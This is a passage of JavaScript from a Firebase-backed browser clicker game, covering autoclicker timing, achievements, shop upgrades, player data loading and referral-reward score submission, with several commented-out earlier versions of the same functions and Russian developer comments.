      updateTaskProgress("collectBigTokens", clickPower);
      updateTaskProgress("clickMasterWeekly", 1);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();

      // Анимация частиц с использованием particles.js
      if (window.pJSDom && window.pJSDom[0] && window.pJSDom[0].pJS) {
        window.pJSDom[0].pJS.fn.particlesEmpty(); // Очищаем текущие частицы
        window.pJSDom[0].pJS.particles.number.value = 20; // Количество частиц
        window.pJSDom[0].pJS.particles.color.value = "#ffd700"; // Золотой цвет для эффекта монет
        window.pJSDom[0].pJS.fn.particlesRefresh(); // Обновляем частицы
      } else {
        console.warn("particles.js не инициализирован или не загружен.");
      }

      // Анимация кнопки (pulse)
      const button = document.getElementById("mainClickButton");
      button.classList.add("pulse");
      setTimeout(() => {
        button.classList.remove("pulse");
        isAnimating = false; // Разрешаем следующую анимацию
      }, 200);

      // Вызываем submitScore с ограничением частоты
      // submitScoreDebounced();
    }
  }).catch(error => {
    console.error('Error updating score via transaction:', error);
    isAnimating = false; // Сбрасываем флаг анимации в случае ошибки
  });
}!!!!!*/ //iskri

    

    function animateCounter() {
      const counter = document.getElementById('counter');
      counter.classList.add('bounce');
      setTimeout(() => {
        counter.classList.remove('bounce');
      }, 200);
    }

    function checkAchievements() {
      if (!achievements.superClicker && totalClicks >= 10000) {
        achievements.superClicker = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Super Clicker! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      if (!achievements.tokenHoarder && score >= 1000000) {
        achievements.tokenHoarder = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Token Hoarder! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      if (!achievements.level5 && currentLevel >= 5) {
        achievements.level5 = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Level 5 Reached! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }
    }

    function saveAchievements() {
      if (!user) return;
      db.ref("achievements/" + user.uid).set(achievements);
    }

    function toggleShop() {
      const shop = document.getElementById("shop");
      const btn = document.getElementById("shopBtn");
      const isCurrentlyOpen = shop.style.display === "block";

      closeAllPanels();

      shop.style.display = isCurrentlyOpen ? "none" : "block";
      btn.innerHTML = isCurrentlyOpen ? "Shop ▼" : "Shop ▲";
    }

  /*!  function startAutoclicker(duration) {
      if (autoclickActive) {
        const remainingTime = Math.max(0, autoclickEndTime - Date.now());
        autoclickEndTime = Date.now() + remainingTime + duration;
        clearInterval(autoclickInterval);
      } else {
        autoclickActive = true;
        autoclickEndTime = Date.now() + duration;
      }

      autoclickInterval = setInterval(() => clickToken(), 1000);
      autoclickerUses++;
      checkAchievements();

      updateProfilePanel();
      submitScore();

      if (user) {
        db.ref("leaderboard/" + user.uid).update({
          autoclickActive: true,
          autoclickEndTime: autoclickEndTime,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error saving autoclicker state:", error);
        });
      }

      setTimeout(() => stopAutoclicker(), autoclickEndTime - Date.now());
    }!*/

/*!!    function startAutoclicker(duration, extendTime = false) {
  if (autoclickActive) {
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    if (remainingTime <= 0) {
      // Если время истекло, сбрасываем автокликер
      stopAutoclicker();
    } else if (extendTime) {
      // Добавляем новое время для награды за задание
      autoclickEndTime = Date.now() + remainingTime + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), remainingTime + duration);
    } else {
      // Заменяем текущий автокликер новым временем (покупка или восстановление)
      autoclickEndTime = Date.now() + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }
  } else {
    // Запускаем новый автокликер
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
    autoclickInterval = setInterval(() => clickToken(), 1000);
    setTimeout(() => stopAutoclicker(), duration);
  }

  // Увеличиваем счётчик использований только при новой активации (не при восстановлении)
  if (extendTime || duration !== (autoclickEndTime - Date.now())) {
    autoclickerUses++;
    checkAchievements();
    updateTaskProgress("autoclickerMaster", 1); // Учитываем активацию для задания
  }

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }
}!!*/// pravilniy



function startAutoclicker(duration, extendTime = false) {
  if (autoclickActive) {
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    if (remainingTime <= 0) {
      stopAutoclicker();
    } else if (extendTime) {
      autoclickEndTime = Date.now() + remainingTime + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => {
        clickToken();
        updateTaskProgress("collectBigTokens", clickPower);
      }, 1000);
      setTimeout(() => stopAutoclicker(), remainingTime + duration);
    } else {
      autoclickEndTime = Date.now() + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => {
        clickToken();
        updateTaskProgress("collectBigTokens", clickPower);
      }, 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }
  } else {
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
    autoclickInterval = setInterval(() => {
      clickToken();
      updateTaskProgress("collectBigTokens", clickPower);
    }, 1000);
    setTimeout(() => stopAutoclicker(), duration);
  }

  if (extendTime || duration !== (autoclickEndTime - Date.now())) {
    autoclickerUses++;
    checkAchievements();
    updateTaskProgress("autoclickerMaster", 1);
  }

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }
}
    
  

    function stopAutoclicker() {
  clearInterval(autoclickInterval);
  autoclickActive = false;
  autoclickEndTime = 0;
  autoclickInterval = null;
  autoclickCooldown = false;
  updateProfilePanel();
  submitScore();
  showMessage("Autoclicker deactivated.");

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: false,
      autoclickEndTime: 0,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error updating autoclicker state:", error);
    });
  }
}

function loadNotifications(uid) {
  db.ref(`notifications/${uid}`).once('value').then(snapshot => {
    const notifications = snapshot.val();
    if (notifications) {
      Object.values(notifications).forEach(notification => {
        if (!notification.read) {
          showMessage(notification.message);
          // Отмечаем уведомление как прочитанное
          db.ref(`notifications/${uid}/${notification.id}`).update({
            read: true,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error('Error marking notification as read:', error);
          });
        }
      });
    }
  }).catch(error => {
    console.error('Error loading notifications:', error);
  });
}

/*!function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      user.referrer_uid = data.referrer_uid || null; // Загружаем реферера
      user.referral_bonus_claimed = data.referral_bonus_claimed || false; // Загружаем флаг бонуса
      const lastUpdate = data.lastUpdate || 0;

      // Обрабатываем временный буст
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        // Восстанавливаем параметры буста
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();

        // Устанавливаем таймер для оставшегося времени
        if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
        tempBoostTimeout = setTimeout(() => {
          clickPower = originalClickPower;
          showMessage(`Буст закончился: Сила клика восстановлена`);
          updateClickPowerBar();
          updateProfilePanel();
          submitScore();

          // Очищаем состояние буста в Firebase
          db.ref("leaderboard/" + uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("Ошибка очистки состояния буста:", error);
          });
          tempBoostTimeout = null;
        }, remainingDuration);
      } else if (tempBoostActive) {
        // Если буст истёк, сбрасываем его
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // Обрабатываем автокликер
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
          updateTaskProgress("collectTokens", tokensEarned); // Добавляем прогресс для collectTokens
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false); // Передаём extendTime = false для восстановления
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
   //   startBonusTimer(); // Запускаем таймер бонуса после загрузки данных
    }

    // Обновляем lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
  }).catch(error => {
    console.error("Ошибка загрузки данных игрока:", error);
    showMessage("Не удалось загрузить данные.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}!*/


/*!!function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      user.referrer_uid = data.referrer_uid || null;
      user.referral_bonus_claimed = data.referral_bonus_claimed || false;
      const lastUpdate = data.lastUpdate || 0;

      // Обработка временного буста
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();

        if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
        tempBoostTimeout = setTimeout(() => {
          clickPower = originalClickPower;
          showMessage(`Буст закончился: Сила клика восстановлена`);
          updateClickPowerBar();
          updateProfilePanel();
          submitScore();
          db.ref("leaderboard/" + uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          });
          tempBoostTimeout = null;
        }, remainingDuration);
      } else if (tempBoostActive) {
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // Обработка автокликера
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          db.ref(`leaderboard/${uid}/score`).transaction(currentScore => {
            score = (currentScore || 0) + tokensEarned;
            return score;
          }).then(() => {
            showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
            updateTaskProgress("collectTokens", tokensEarned);
            updateTaskProgress("collectBigTokens", tokensEarned);
            updateCounterDisplay();
          });
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false);
      } else if (autoclickActive) {
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
     // startBonusTimer();
    }

    db.ref("leaderboard/" + uid).update({
      lastUpdate: Date.now()
    });
  }).catch(error => {
    console.error("Ошибка загрузки данных игрока:", error);
    showMessage("Не удалось загрузить данные.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}!!*/ //rabochiy



function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      crystals = data.crystals || 0; // Load crystals
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      user.referrer_uid = data.referrer_uid || null;
      user.referral_bonus_claimed = data.referral_bonus_claimed || false;
      const lastUpdate = data.lastUpdate || 0;

      // Обработка временного буста
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();

        if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
        tempBoostTimeout = setTimeout(() => {
          clickPower = originalClickPower;
          showMessage(`Boost ended: Click Power restored`);
          updateClickPowerBar();
          updateProfilePanel();
          submitScore();
          db.ref("leaderboard/" + uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          });
          tempBoostTimeout = null;
        }, remainingDuration);
      } else if (tempBoostActive) {
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // Обработка автокликера
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          db.ref(`leaderboard/${uid}/score`).transaction(currentScore => {
            score = (currentScore || 0) + tokensEarned;
            return score;
          }).then(() => {
            showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
            updateTaskProgress("collectTokens", tokensEarned);
            updateTaskProgress("collectBigTokens", tokensEarned);
            updateCounterDisplay();
          });
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false);
      } else if (autoclickActive) {
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
      startBonusTimer();
      checkWeeklyReset(); // Проверяем сброс еженедельной таблицы
      if (score >= 50000) updateWeeklyScore(); // Обновляем еженедельный счет
    }

    db.ref("leaderboard/" + uid).update({
      lastUpdate: Date.now()
    });
  }).catch(error => {
    console.error("Ошибка загрузки данных игрока:", error);
    showMessage("Не удалось загрузить данные.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}
  
  
              

 /*!!!!   function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    referrer_uid: user.referrer_uid || null,
    referral_bonus_claimed: user.referral_bonus_claimed || false,
    lastUpdate: Date.now()
  }).then(() => {
    // Проверяем, есть ли реферер
    if (user.referrer_uid) {
      // Обновляем количество заработанных токенов приглашённым
      db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
        tokens_earned: score,
        lastUpdate: Date.now()
      }).then(() => {
        // Проверяем, достиг ли пользователь 1000 токенов
        if (score >= 1000) {
          db.ref(`referrals/${user.referrer_uid}/${user.uid}`).once('value').then(refSnapshot => {
            const refData = refSnapshot.val();
            if (refData && !refData.reward_claimed) {
              // Начисляем 1000 токенов приглашающему
              db.ref(`leaderboard/${user.referrer_uid}/score`).transaction(currentScore => {
                return (currentScore || 0) + 1000;
              }).then(() => {
                console.log(`Referral reward of 1000 tokens credited to inviter: ${user.referrer_uid}`);

                // Создаём уведомление для приглашающего
                db.ref(`notifications/${user.referrer_uid}`).push({
                  message: 'Referral reward: +1000 tokens!',
                  timestamp: Date.now(),
                  read: false
                }).then(() => {
                  console.log(`Notification created for inviter: ${user.referrer_uid}`);
                }).catch(error => {
                  console.error('Error creating notification for inviter:', error);
                });

              }).catch(error => {
                console.error('Error crediting inviter:', error);
              });

              // Начисляем 1000 токенов приглашённому
              score += 1000;
              showMessage('Milestone reward: +1000 tokens!');
              db.ref(`leaderboard/${user.uid}/score`).set(score).then(() => {
                console.log(`Milestone reward of 1000 tokens credited to invited: ${user.uid}`);
                updateCounterDisplay();
              }).catch(error => {
                console.error('Error crediting invited:', error);
              });

              // Отмечаем награду как полученную
              db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
                reward_claimed: true,
                lastUpdate: Date.now()
              }).then(() => {
                console.log('Reward marked as claimed for:', user.uid);
              }).catch(error => {
                console.error('Error marking reward as claimed:', error);
              });

              // Логируем начисление награды
              db.ref('referral_logs').push({
                inviter_uid: user.referrer_uid,
                invited_uid: user.uid,
                timestamp: Date.now(),
                action: 'reward_claimed',
                inviter_reward: 1000,
                invited_reward: 1000
              });
            } else if (refData && refData.reward_claimed) {
              console.log('Reward already claimed for:', user.uid);
            }
          }).catch(error => {
            console.error('Error checking referral data:', error);
          });
        }
      }).catch(error => {
        console.error('Error updating referral tokens earned:', error);
      });
    }
  }).catch(error => {
    console.error('Error saving score:', error);
    showMessage('Failed to save progress.');
  });
} !!!!*/ //clickToken         




 /*!  function submitScore() {
  if (!user) {
    console.log('User not authenticated, cannot submit score.');
    return;
  }

  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;

  // Обновляем данные, но score уже обновляется через транзакции в других местах
  db.ref("leaderboard/" + user.uid).update({
    id: user.uid,
    name: userName,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    referrer_uid: user.referrer_uid || null,
    referral_bonus_claimed: user.referral_bonus_claimed || false,
    lastUpdate: Date.now()
  }).then(() => {
    console.log(`Leaderboard updated for ${user.uid}`);
    // Реферальная логика остаётся без изменений
    if (user.referrer_uid) {
      db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
        tokens_earned: score,
        lastUpdate: Date.now()
      }).then(() => {
        if (score >= 1000) {
          db.ref(`referrals/${user.referrer_uid}/${user.uid}`).once('value').then(refSnapshot => {
            const refData = refSnapshot.val();
            if (refData && !refData.reward_claimed) {
              db.ref(`leaderboard/${user.referrer_uid}/score`).transaction(currentScore => {
                return (currentScore || 0) + 1000;
              }).then(() => {
                db.ref(`notifications/${user.referrer_uid}`).push({
                  message: 'Referral reward: +1000 tokens!',
                  timestamp: Date.now(),
                  read: false
                });
              }).catch(error => {
                console.error('Error crediting inviter:', error);
              });

              db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
                score = (currentScore || 0) + 1000;
                return score;
              }).then(() => {
                showMessage('Milestone reward: +1000 tokens!');
                updateCounterDisplay();
              }).catch(error => {
                console.error('Error crediting invited:', error);
              });

              db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
                reward_claimed: true,
                lastUpdate: Date.now()
              });

              db.ref('referral_logs').push({
                inviter_uid: user.referrer_uid,
                invited_uid: user.uid,
                timestamp: Date.now(),
                action: 'reward_claimed',
                inviter_reward: 1000,
                invited_reward: 1000
              });
            }
          }).catch(error => {
            console.error('Error checking referral data:', error);
          });
        }
      }).catch(error => {
        console.error('Error updating referral tokens earned:', error);
      });
    }
  }).catch(error => {
    console.error('Error updating leaderboard:', error);
    showMessage('Failed to save progress.');
  });
}!*/ //rabochiy


function submitScore() {
  if (!user) {
    console.log('User not authenticated, cannot submit score.');
    return;
  }

  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;

  // Обновляем данные в общей таблице лидеров
  db.ref("leaderboard/" + user.uid).update({
    id: user.uid,
    name: userName,
    score: score, // Явно сохраняем score
    crystals: crystals, // Save crystals
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    referrer_uid: user.referrer_uid || null,
    referral_bonus_claimed: user.referral_bonus_claimed || false,
    lastUpdate: Date.now()
  }).then(() => {
    console.log(`Leaderboard updated for ${user.uid}`);
    // Обновляем еженедельный счет
    if (score >= 50000) {
      updateWeeklyScore();
    }
    // Реферальная логика
    if (user.referrer_uid) {
      db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
        tokens_earned: score,
        lastUpdate: Date.now()
      }).then(() => {
        if (score >= 1000) {
          db.ref(`referrals/${user.referrer_uid}/${user.uid}`).once('value').then(refSnapshot => {
            const refData = refSnapshot.val();
            if (refData && !refData.reward_claimed) {
              db.ref(`leaderboard/${user.referrer_uid}/score`).transaction(currentScore => {
                return (currentScore || 0) + 1000;
              }).then(() => {
                db.ref(`notifications/${user.referrer_uid}`).push({
                  message: 'Referral reward: +1000 tokens!',
                  timestamp: Date.now(),
                  read: false
                });
              }).catch(error => {
                console.error('Error crediting inviter:', error);
              });

              db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
                score = (currentScore || 0) + 1000;
                return score;
              }).then(() => {
                showMessage('Milestone reward: +1000 tokens!');
                updateCounterDisplay();
              }).catch(error => {
                console.error('Error crediting invited:', error);
              });

              db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
                reward_claimed: true,
                lastUpdate: Date.now()
              });

              db.ref('referral_logs').push({
                inviter_uid: user.referrer_uid,
                invited_uid: user.uid,
                timestamp: Date.now(),
                action: 'reward_claimed',
                inviter_reward: 1000,
                invited_reward: 1000
              });
            }
          }).catch(error => {
            console.error('Error checking referral data:', error);
          });
        }
      }).catch(error => {
        console.error('Error updating referral tokens earned:', error);
      });
    }
  }).catch(error => {
    console.error('Error updating leaderboard:', error);
    showMessage('Failed to save progress.');
  });
}

  
  
  

   /*! function submitScore() {
      if (!user) return;
      const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
      db.ref("leaderboard/" + user.uid).set({
        id: user.uid,
        name: userName,
        score: score,
        clickPower: clickPower,
        autoclickActive: autoclickActive,
        autoclickEndTime: autoclickEndTime,
        tempBoostActive: !!tempBoostTimeout,
        tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
        tempBoostOriginalClickPower: originalClickPower || clickPower,
        tempBoostAmount: clickPower - (originalClickPower || clickPower),
        lastUpdate: Date.now()



        
      }).catch(error => {
        console.error("Ошибка сохранения счёта:", error);
        showMessage("Не удалось сохранить прогресс.");
      });
    }!*/



 /*!!  function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? (Date.now() + (tempBoostEndTime || 0)) : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("Ошибка сохранения счёта:", error);
    showMessage("Не удалось сохранить прогресс.");
  });
}!!*/

    

  /*!  function buyUpgrade(type) {
      const cost = getClickPowerUpgradeCost();
      if (type === "clickPower") {
        if (clickPower >= 8) {
          showMessage("Click Power is at maximum!");
          return;
        }

        const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
        if (clickPower >= 3 && currentLevel < clickPower + 1) {
          showMessage(`Reach player level ${clickPower + 1} to upgrade Click Power further!`);
          const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");
          buyButton.style.animation = "shake 0.3s";
          setTimeout(() => buyButton.style.animation = "", 300);
          return;
        }

        if (score >= cost) {
          score -= cost;
          clickPower++;
          updateCounterDisplay();
          updateClickPowerBar();
          updateProfilePanel();
          updateClickPowerCostText();
          submitScore();
          showMessage("Click Power upgraded!");
        } else {
          showMessage("Not enough tokens for upgrade.");
        }
      }
    }!*/


    function buyUpgrade(type) {
  if (type === "clickPower") {
    if (clickPower >= 8) {
      showMessage("Click Power is at maximum!");
      return;
    }

    const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
    if (clickPower >= 3 && currentLevel < clickPower + 1) {
      showMessage(`Reach player level ${clickPower + 1} to upgrade Click Power further!`);
      const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");
      buyButton.style.animation = "shake 0.3s";
      setTimeout(() => buyButton.style.animation = "", 300);
      return;
    }

    const cost = getClickPowerUpgradeCost();

    // Проверяем и обновляем score через транзакцию
    db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
      const newScore = (currentScore || 0) - cost;
      if (newScore < 0) {
        // Отменяем транзакцию, если недостаточно токенов
        return undefined;
      }
      return newScore;
    }).then(transactionResult => {
      if (transactionResult.committed) {
        // Транзакция успешна
        score = transactionResult.snapshot.val();
        clickPower++;
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
        updateClickPowerCostText();
        submitScore();
        showMessage("Click Power upgraded!");
      } else {
        showMessage("Not enough tokens for upgrade.");
      }
    }).catch(error => {
      console.error("Error during upgrade transaction:", error);
      showMessage("Failed to upgrade Click Power.");
    });
  }
}

  

function buyAutoclicker(minutes) {
  if (autoclickCooldown) {
    showMessage("Autoclicker on cooldown.");
    return;
  }

  const prices = {
    1: 200,
    5: 800,
    10: 1400
  };

  const cost = prices[minutes];
  if (score >= cost) {
    score -= cost;
    updateCounterDisplay();
    showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
    autoclickCooldown = true;
    const duration = minutes * 60000;
    startAutoclicker(duration, false); // Передаём extendTime = false для замены времени
    updateTaskProgress("autoclickerMaster", 1);

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        autoclickActive: true,
        autoclickEndTime: autoclickEndTime,
        score: score,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Error saving autoclicker purchase:", error);
      });
    }

    updateProfilePanel();
    submitScore();
  } else {
    showMessage("Not enough tokens for autoclicker.");
  }
}
    
//noviy autocliker
function updateAutoclickerShop() {
  const levelDisplay = document.getElementById("autoclickerLevel");
  const durationDisplay = document.getElementById("autoclickerDurationValue");
  const upgradeCostDisplay = document.getElementById("autoclickerUpgradeCost");
  const upgradeBtn = document.getElementById("upgradeAutoclickerBtn");
  const freeAutoclickerBtn = document.getElementById("activateFreeAutoclickerBtn");

  levelDisplay.innerText = autoclickerLevel;
  const durationSeconds = Math.floor(getAutoclickerDuration() / 1000);
  durationDisplay.innerText = durationSeconds >= 3600 
    ? `${Math.floor(durationSeconds / 3600)}h ${Math.floor((durationSeconds % 3600) / 60)}m`
    : durationSeconds >= 60 
      ? `${Math.floor(durationSeconds / 60)}m ${durationSeconds % 60}s`
      : `${durationSeconds}s`;

  if (autoclickerLevel >= 20) {
    upgradeCostDisplay.innerText = "Autoclicker: MAX LEVEL";
    upgradeBtn.disabled = true;
  } else if (autoclickerLevel >= Math.min(currentLevel, 4)) {
    upgradeCostDisplay.innerText = `Need Player Level ${autoclickerLevel + 1}`;
    upgradeBtn.disabled = true;
  } else {
    const cost = getAutoclickerUpgradeCost();
    upgradeCostDisplay.innerText = `Upgrade Cost: ${cost.tokens} Tokens + ${cost.crystals} 💎`;
    upgradeBtn.disabled = false;
  }

  freeAutoclickerBtn.disabled = autoclickActive;
}


//noviy autoclicker    
function activateFreeAutoclicker() {
  if (autoclickActive) {
    showMessage("Autoclicker is already active!");
    return;
  }

  const duration = getAutoclickerDuration();
  startAutoclicker(duration);
  autoclickerUses++;
  updateTaskProgress("autoclickerMaster", 1);
  checkAchievements();
